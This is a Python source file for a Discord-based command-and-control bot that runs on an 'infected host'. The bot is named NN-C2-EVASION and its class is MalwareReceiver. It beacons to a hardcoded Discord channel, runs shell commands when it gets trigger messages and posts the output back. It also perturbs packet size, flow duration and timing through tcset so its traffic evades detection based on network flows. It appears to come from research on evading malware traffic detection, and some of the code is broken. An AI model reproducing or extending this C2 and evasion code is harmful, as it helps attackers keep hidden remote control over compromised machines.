

"""
This program will act as a Discord bot to read and write information to the discord channel on the infected host.
Client ID: 497092391811940362
Bot name: NN-C2-EVASION
Permissions integer: 8
"""

import asyncio
import aiohttp
import json, time, sys, os, subprocess
from discord import Game
import discord
from discord.ext.commands import Bot
#from pupylib.PupyModule import config, PupyArgumentParser, PupyModule
import random, subprocess, logging, hashlib, sched, operator
from NetworkFlow import NetworkFlow
from concurrent.futures import ProcessPoolExecutor, Future
from collections import deque
from queue import Queue
from Util.out import print_error
import numpy as np

BOT_PREFIX = ("?", "!")


TOKEN = "" # Get at discordapp.com/developers/applications/me

with open("tokenfile", "r") as f:
    TOKEN = f.readline().strip("\n")
    print(TOKEN)

m = hashlib.md5()
host_id = TOKEN.encode("utf-8")
print("Host ID:", host_id)
m.update(host_id)
ID = m.hexdigest()
print(ID)

s = sched.scheduler(time.time, time.sleep)


class TimeoutException(Exception):
    pass

class MalwareReceiver:

    def __init__(self, flows):

        # Moving many parameters to the Flow class
        self.instructor_available = False
        self.active = False
        self.instruction_set = None
        self.is_blocked = False
        self.instructionSetPupy = {"pingback" : "pwd"}

        self.perturbationParams = {
            "MaxPacketSizeBytes" : 500,
            "TimeDeltaMs" : 1000,
            "NetworkFlowDuration" : 17,
            "CommandDelay" : 3,
            "OfflineDuration" : 10,
            "HeartbeatDelay" : 2,
            "ReplyDelay" : 2
        }

        # Using a queue for future functionality regarding time-series based network flows
        self.network_flow_queue = []
        self.previously_run_flows = []

        logging.basicConfig(filename="perturbationLog.txt", level=logging.DEBUG)

        self.client = Bot(command_prefix=BOT_PREFIX)

        # Start values of perturbation vector. Consider taking from command line.
        # Add 1200000 bytes, increase duration of network flow with 10 second, increase time_between_network_flows by 10 seconds.
        self.perturbation_vector = [120000, 10000, 1000]
        self.trained = False

        self.prev_flow = None
        self.cur_flow = None

        self.id = 0

        while not self.trained:
            self.cur_flow = self.Flow(self.id, self.perturbation_vector, self.client)
            self.network_flow_queue.append(self.cur_flow)
            # do stuff with cur_flow
            # For instance try to calculate perturbation parameters?
            self.add_to_vector = self.network_flow_queue[0].update_perturbation_vector(150000, 20000, 1400)
            self.perturbation_vector = list(map(sum, zip(self.perturbation_vector, self.add_to_vector)))

            self.network_flow_queue[0].setup()
            self.prev_flow = self.cur_flow
            self.previously_run_flows.append(self.network_flow_queue[0])



    class Flow():
        """
        A class to manage a single flow.
        Copyright: https://github.com/stratosphereips/StratosphereTestingFramework/blob/master/stf/core/connections.py

        Add support for importing TOKEN as a variable, in order to allow connections with different servers (and different IPs).
        The Flows can then be added to the run Queue in Malware Receiver.
        """
        def __init__(self, id, perturbation_vector, client):

            self.id = id
            self.set_t1(False)
            self.set_t2(False)
            self.set_td(False)
            self.line_separator = ','
            self.client = client



            self.instructionSetAliases = {
                "oy mate" : "pingback"
            }

            # Will not be used. Keep for reference
            self.perturbationParams = {
                "MaxPacketSizeBytes" : perturbation_vector[0],
                "TimeDeltaMs" : 1000,
                "NetworkFlowDuration" : perturbation_vector[1],
                "CommandDelay" : 3,
                "OfflineDuration" : perturbation_vector[2],
                "HeartbeatDelay" : 0.5,
                "ReplyDelay" : 2
            }

            # Adding the three detrimental parameters to a vector that belongs to this flow.
            self.param_vector = perturbation_vector

        def update_throughput(self):
            # Throughput in Kbps = Packet Size Bytes * 8 / duration. Adding 20% more bytes to accommodate for irregularities.
            self.throughput = round((self.param_vector[0] * 8 * 1.2 / self.param_vector[1])/1000, 2)

        def set_tcconfig(self):
            # Get the IP of discord server
            subprocess.check_call(["tcset", "--rate ", str(self.throughput) + "Kbps eth0"])

        def set_size(self, size):
            self.size = size

        def set_t1(self,t1):
            # Flow start time
            self.t1 = t1

        def set_t2(self,t2):
            # Flow end time
            self.t2 = t2

        def set_td(self,td):
            # Flow time delta
            self.td = float(td)

        def get_t1(self):
            return self.t1

        def get_t2(self):
            return self.t2

        def get_td(self):
            return self.td

        def get_id(self):
            return self.id

        def setup(self):

            self.set_tcconfig()

            @self.client.event
            @asyncio.coroutine
            async def on_ready():
                print('Logged in as')
                self.t1 = time.time()
                self.t2 = self.t1 + float(self.param_vector[1])
                self.size = self.param_vector[0]
                print(self.client.user.name + "\n" + self.client.user.id + "\n--------")
                tmpLoop = asyncio.get_event_loop()
                print(tmpLoop)
                await heartbeat()
                print("After heartbeat loop initiated.")

            @self.client.event
            @asyncio.coroutine
            async def on_message(message):
                channel = message.channel
                if message.content[1:] in self.instructionSetAliases:
                    subprocess.check_call(["pwd"])
                    #proc = subprocess.Popen(["C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe", ";", "&pwd"], stdout=subprocess.PIPE)
                    output = proc.stdout.read()
                    await self.client.send_message(channel, str(output).ljust(100, u'A'))
                elif message.attachments:
                    perturbation_payload = message.attachments[0]


            async def heartbeat():
                print("Entered heartbeat loop.")
                time.sleep(self.perturbationParams["HeartbeatDelay"])
                if int(time.time() - self.t1) >= self.perturbationParams["NetworkFlowDuration"]:
                    print("Network flow duration expired")
                    logging.debug("Network flow duration expired")
                    self.client.logout()
                    self.waitfor_flowtime(self.client, self.perturbationParams["OfflineDuration"])
                    return
                else:
                    #send this to prepare_message instead
                    print("Network flow duration not yet expired")
                    logging.debug("Network flow duration not yet expired")
                    await self.prepare_message(ID)
                    print("Message sent.")

                await heartbeat()

            self.run()


                #@self.client.event
                #@asyncio.coroutine
                #async def delayed_padded_message(channel, message):


        def run(self):
                #ex = ProcessPoolExecutor(1)
                #exitTask = self.client.loop.create_task(self.waitfor_flowtime(self.client, 5))
                tmpLoop = asyncio.get_event_loop()
                try:
                    #self.client.loop.run_in_executor(ex, self.client.run(TOKEN))
                    self.client.run(TOKEN)
                    #self.waitfor_flowtime(self.client, 10)
                    #self.client.loop.run_until_complete(asyncio.wait_for(self.waitfor_flowtime(self.client.loop, 5), timeout=5.0))
                    tmpLoop.run_in_executor(None, waitfor_flowtime, self.perturbationParams["OfflineDuration"]/100)
                except Exception as e:
                    #self.client.loop.run_until_complete(self.client.logout())
                    logging.debug("Error logging in. Client disconnected.")
                    self.client.close()

        def update_perturbation_vector(self, th_bytes=0, th_flow_dur_ms=0, th_flow_delay_ms=0):
            """
            Generates a new vector with the given arguments for the next network flow.
            Negative numbers must be given if the values should be decreased.
            th_bytes in whole bytes
            th_flow_dur, th_flow_delay in ms
            try:
                return [randint(self.param_vector[0], th_bytes), randint(self.param_vector[1], th_flow_dur_ms), randint(self.param_vector[2], th_flow_delay_ms)]
            except Exception as e:
                exc_type, exc_obj, exc_tb = sys.exc_info()
                fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                print_error("Unable to alter perturbation vector. Line: " + str(exc_tb.tb_lineno))"""
            self.param_vector = [random.randint(self.param_vector[0], th_bytes), random.randint(self.param_vector[1], th_flow_dur_ms), random.randint(self.param_vector[2], th_flow_delay_ms)]
            self.update_throughput()
            return self.param_vector


            #self.client.run(TOKEN)
        def waitfor_flowtime(self, client, seconds):
            print("Sleeping ...")
            self.client.close()
            time.sleep(self.perturbationParams["OfflineDuration"])
            print("Slept.")
            self.setup()

        def listen(self):
            time.sleep(1)


        @asyncio.coroutine
        async def prepare_message(self, message):
            """
            Add appropriate padding and delay for self.perturbationParams["CommandDelay"] amount of timeself.

            Extend this method to support queued perturbation parameters.
            """
            print("Preparing message, delaying ...")
            channel = self.client.get_channel("496300091028799491")
            print(channel.name)

            while sys.getsizeof(message) + 100 < self.perturbationParams["MaxPacketSizeBytes"]:
                message = message + "A"

            time.sleep(self.perturbationParams["CommandDelay"])
            print("Delayed. Sending message to channel ...", channel)
            await self.client.send_message(channel, message)

        async def execute_instruction_set(self, instruction):
            """
            Executes the instructions received and generates report and feedback for the control server.
            Must enable the pupy client prior to running the "remote" command.
            """
            if instruction == "pwd":
                instructionObj = pwd(None)
                output = instructionObj.run()
                if output != None:
                    self.check_if_blocked()
                    self.generate_report("pwd")
                self.check_if_blocked()
            print()



    async def check_instructor_availability(self):
        """
        Sends a message to the discord channel. Based on the response, evaluate whether the instructor is available.
        """
        print(self.instructor_available)

    async def check_if_new_messages(self):
        return len(self.client.messages) > 0


    """
    These below two methods could possibly exist in a feedback loop.
    """
    async def request_instruction_set(self):
        """
        Let the instructor know that the malware is awaiting further instructions.
        """
        active = True
        while active:
            time.sleep(0.5)
            while len(self.client.messages) != 0:
                message = self.client.messages.pop()
                if message in self.instructionSetAliases:
                    execute_instruction_set(self.instructionSetAliases[message])

            self.check_if_blocked()
        print("Waiting for instructions ...")



    async def check_if_blocked(self):
        print()

    @asyncio.coroutine
    async def list_servers():
        await client.wait_until_ready()
        while not client.is_closed:
            print("Current servers:")
            for server in client.servers:
                print(server.name)
            await asyncio.sleep(600)

testclient = MalwareReceiver(0)
